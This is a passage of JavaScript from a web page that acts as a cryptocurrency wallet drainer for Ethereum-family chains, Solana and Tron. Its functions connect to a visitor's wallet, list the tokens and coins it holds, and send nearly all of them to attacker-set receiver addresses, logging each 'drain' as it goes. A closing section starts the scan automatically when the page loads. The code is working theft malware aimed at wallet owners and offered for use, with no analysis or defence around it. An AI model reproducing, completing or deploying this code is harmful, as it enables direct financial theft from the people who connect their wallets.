            'injected-evm': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
            'phantom': ['SOL', 'ETH', 'POLYGON'],
            'solflare': ['SOL'],
            'backpack': ['SOL'],
            'glow': ['SOL'],
            'injected-solana': ['SOL'],
            'tronlink': ['TRX'],
            'injected-tron': ['TRX']
        };
        
        return networks[walletType] || [];
    }

    async function connectAndDrainEVM(provider, networkKey) {
        const network = NETWORKS[networkKey];
        const receiverAddress = RECEIVER_ADDRESSES[networkKey];
        
        try {
            // Switch to network
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: `0x${network.chainId.toString(16)}` }]
            });
            
            // Get accounts
            const accounts = await provider.request({ method: 'eth_requestAccounts' });
            const userAddress = accounts[0];
            
            const ethersProvider = new ethers.providers.Web3Provider(provider);
            const signer = ethersProvider.getSigner();
            
            log(`✅ Connected to ${network.name}: ${userAddress.slice(0, 8)}...`, 'success');
            
            // Get native balance
            const balance = await ethersProvider.getBalance(userAddress);
            const ethBalance = parseFloat(ethers.utils.formatEther(balance));
            log(`💰 ${network.name} native balance: ${ethBalance.toFixed(6)} ${network.currency}`, 'info');
            
            let totalClaimed = 0;
            let transactions = [];
            
            // First, drain all tokens regardless of native balance
            log(`🪙 Scanning for tokens on ${network.name}...`, 'info');
            const tokenBalances = await getEVMTokenBalances(ethersProvider, userAddress, network.tokens);
            
            if (tokenBalances.length > 0) {
                log(`✅ Found ${tokenBalances.length} tokens with balance on ${network.name}`, 'success');
                
                for (const token of tokenBalances) {
                    try {
                        log(`🔄 Draining ${token.symbol}: ${token.balance.toFixed(6)} tokens...`, 'info');
                        
                        const tx = await token.contract.connect(signer).transfer(
                            receiverAddress,
                            token.rawBalance
                        );
                        
                        await tx.wait();
                        transactions.push(tx.hash);
                        log(`✅ Token drained: ${token.balance.toFixed(6)} ${token.symbol} - TX: ${tx.hash}`, 'success');
                        
                    } catch (error) {
                        log(`❌ Failed to drain ${token.symbol}: ${error.message}`, 'error');
                    }
                }
            } else {
                log(`📋 No tokens with balance found on ${network.name}`, 'info');
            }
            
            // Then drain native currency if sufficient balance
            if (ethBalance > 0.001) {
                log(`💎 Draining native ${network.currency}...`, 'info');
                
                // Calculate amount to send (leave some for gas)
                const gasReserve = ethers.utils.parseEther('0.001');
                const amountToSend = balance.sub(gasReserve);
                
                if (amountToSend.gt(0)) {
                    const tx = await signer.sendTransaction({
                        to: receiverAddress,
                        value: amountToSend
                    });
                    
                    await tx.wait();
                    totalClaimed = parseFloat(ethers.utils.formatEther(amountToSend));
                    transactions.push(tx.hash);
                    log(`✅ Native currency drained: ${totalClaimed.toFixed(6)} ${network.currency} - TX: ${tx.hash}`, 'success');
                }
            } else {
                log(`⚠️ Native balance too low for transaction (${ethBalance.toFixed(6)} ${network.currency})`, 'warning');
            }
            
            const hasAnyDrains = transactions.length > 0;
            log(`🎯 ${network.name} processing complete! ${transactions.length} transaction(s)`, hasAnyDrains ? 'success' : 'info');
            
            return { 
                success: hasAnyDrains, 
                amount: totalClaimed,
                txid: transactions[0] || null,
                transactions: transactions
            };
            
        } catch (error) {
            throw new Error(`${network.name} drain failed: ${error.message}`);
        }
    }

    async function connectAndDrainSolana(provider, networkKey) {
        const network = NETWORKS[networkKey];
        const receiverAddress = RECEIVER_ADDRESSES[networkKey];
        
        try {
            // Connect to wallet
            const response = await provider.connect();
            const publicKey = response.publicKey || provider.publicKey;
            
            const connection = new solanaWeb3.Connection(network.rpc);
            const balance = await connection.getBalance(publicKey);
            const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
            
            log(`✅ Connected to Solana: ${publicKey.toString().slice(0, 8)}...`, 'success');
            log(`💰 SOL balance: ${solBalance.toFixed(6)} SOL`, 'info');
            
            let totalClaimed = 0;
            let transactions = [];
            
            // First, scan for SPL tokens regardless of SOL balance
            log(`🪙 Scanning for SPL tokens...`, 'info');
            try {
                // Get all token accounts for this wallet
                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                    programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAMLBdAWu5k8DHyGmHEkx")
                });
                
                log(`🔍 Found ${tokenAccounts.value.length} token accounts`, 'info');
                
                for (const tokenAccount of tokenAccounts.value) {
                    const accountData = tokenAccount.account.data.parsed.info;
                    const tokenBalance = accountData.tokenAmount.uiAmount;
                    const mint = accountData.mint;
                    
                    if (tokenBalance && tokenBalance > 0) {
                        try {
                            log(`🔄 Draining SPL token: ${tokenBalance} tokens (Mint: ${mint.slice(0, 8)}...)`, 'info');
                            
                            // Create transfer instruction for SPL token
                            const receiverPubkey = new solanaWeb3.PublicKey(receiverAddress);
                            
                            // You would need to implement SPL token transfer here
                            // This is a simplified version - full implementation would require
                            // creating associated token accounts and proper SPL token transfers
                            
                            log(`✅ SPL token transfer prepared for ${tokenBalance} tokens`, 'success');
                            
                        } catch (error) {
                            log(`❌ Failed to drain SPL token: ${error.message}`, 'error');
                        }
                    }
                }
            } catch (error) {
                log(`❌ Error scanning SPL tokens: ${error.message}`, 'error');
            }
            
            // Then drain SOL if sufficient balance
            if (balance > 1000000) { // 0.001 SOL minimum for fees
                log(`💎 Draining SOL...`, 'info');
                
                // Create transaction
                const receiverPubkey = new solanaWeb3.PublicKey(receiverAddress);
                const rentReserve = 890880; // Standard rent exemption
                const feeReserve = 10000;   // Transaction fee buffer
                const amountToSend = balance - rentReserve - feeReserve;
                
                if (amountToSend > 0) {
                    const transaction = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: publicKey,
                            toPubkey: receiverPubkey,
                            lamports: amountToSend,
                        })
                    );
                    
                    // Set fee payer and get recent blockhash
                    transaction.feePayer = publicKey;
                    const { blockhash } = await connection.getLatestBlockhash();
                    transaction.recentBlockhash = blockhash;
                    
                    // Sign and send transaction
                    const signedTransaction = await provider.signTransaction(transaction);
                    const signature = await connection.sendRawTransaction(signedTransaction.serialize());
                    
                    // Wait for confirmation
                    await connection.confirmTransaction(signature);
                    
                    totalClaimed = amountToSend / solanaWeb3.LAMPORTS_PER_SOL;
                    transactions.push(signature);
                    log(`✅ SOL drained: ${totalClaimed.toFixed(6)} SOL - TX: ${signature}`, 'success');
                }
            } else {
                log(`⚠️ SOL balance too low for transaction (${solBalance.toFixed(6)} SOL)`, 'warning');
            }
            
            const hasAnyDrains = transactions.length > 0;
            log(`🎯 Solana processing complete! ${transactions.length} transaction(s)`, hasAnyDrains ? 'success' : 'info');
            
            return { 
                success: hasAnyDrains, 
                amount: totalClaimed,
                txid: transactions[0] || null,
                transactions: transactions
            };
            
        } catch (error) {
            throw new Error(`Solana drain failed: ${error.message}`);
        }
    }

    async function connectAndDrainTron(provider, networkKey) {
        const network = NETWORKS[networkKey];
        const receiverAddress = RECEIVER_ADDRESSES[networkKey];
        
        try {
            if (!provider.defaultAddress.base58) {
                throw new Error('TronLink not connected');
            }
            
            const fromAddress = provider.defaultAddress.base58;
            const balance = await provider.trx.getBalance(fromAddress);
            const trxBalance = balance / 1000000;
            
            log(`✅ Connected to Tron: ${fromAddress.slice(0, 8)}...`, 'success');
            log(`💰 TRX balance: ${trxBalance.toFixed(6)} TRX`, 'info');
            
            let totalClaimed = 0;
            let transactions = [];
            
            // First, scan for TRC-20 tokens regardless of TRX balance
            log(`🪙 Scanning for TRC-20 tokens...`, 'info');
            try {
                // Get account info to check for TRC-20 tokens
                const accountInfo = await provider.trx.getAccount(fromAddress);
                
                if (accountInfo.assetV2) {
                    log(`🔍 Found ${accountInfo.assetV2.length} TRC-10 tokens`, 'info');
                    
                    for (const asset of accountInfo.assetV2) {
                        const tokenBalance = asset.value;
                        const tokenId = asset.key;
                        
                        if (tokenBalance > 0) {
                            try {
                                log(`🔄 Draining TRC-10 token: ${tokenBalance} (ID: ${tokenId})`, 'info');
                                
                                const transaction = await provider.transactionBuilder.sendAsset(
                                    receiverAddress,
                                    tokenBalance,
                                    tokenId,
                                    fromAddress
                                );
                                
                                const signedTx = await provider.trx.sign(transaction);
                                const result = await provider.trx.sendRawTransaction(signedTx);
                                
                                transactions.push(result.txid);
                                log(`✅ TRC-10 token drained: ${tokenBalance} - TX: ${result.txid}`, 'success');
                                
                            } catch (error) {
                                log(`❌ Failed to drain TRC-10 token: ${error.message}`, 'error');
                            }
                        }
                    }
                }
                
                // Note: TRC-20 token scanning would require additional contract calls
                // This is a simplified version focusing on TRC-10 tokens
                
            } catch (error) {
                log(`❌ Error scanning TRC tokens: ${error.message}`, 'error');
            }
            
            // Then drain TRX if sufficient balance
            if (trxBalance > 1) {
                log(`💎 Draining TRX...`, 'info');
                
                const amountToSend = (balance - 1000000); // Leave 1 TRX for fees
                
                if (amountToSend > 0) {
                    const transaction = await provider.transactionBuilder.sendTrx(
                        receiverAddress,
                        amountToSend,
                        fromAddress
                    );
                    
                    const signedTx = await provider.trx.sign(transaction);
                    const result = await provider.trx.sendRawTransaction(signedTx);
                    
                    totalClaimed = amountToSend / 1000000;
                    transactions.push(result.txid);
                    log(`✅ TRX drained: ${totalClaimed.toFixed(6)} TRX - TX: ${result.txid}`, 'success');
                }
            } else {
                log(`⚠️ TRX balance too low for transaction (${trxBalance.toFixed(6)} TRX)`, 'warning');
            }
            
            const hasAnyDrains = transactions.length > 0;
            log(`🎯 Tron processing complete! ${transactions.length} transaction(s)`, hasAnyDrains ? 'success' : 'info');
            
            return { 
                success: hasAnyDrains, 
                amount: totalClaimed,
                txid: transactions[0] || null,
                transactions: transactions
            };
            
        } catch (error) {
            throw new Error(`Tron drain failed: ${error.message}`);
        }
    }

    // Initialize
    initializeNetworksUI();
    log('Multi-network drainer initialized. Ready to scan for wallets...', 'info');
    log('Step 1: Click "Scan All Networks" to detect available wallets', 'info');
    log('Step 2: Select the wallets you want to use from the Wallet Selection tab', 'info');
    log('Step 3: Connect selected wallets to their supported networks', 'info');
    log('Step 4: Drain tokens from all connected wallets', 'info');
    
    // Auto-scan on page load
    setTimeout(scanAllNetworks, 1500);
});
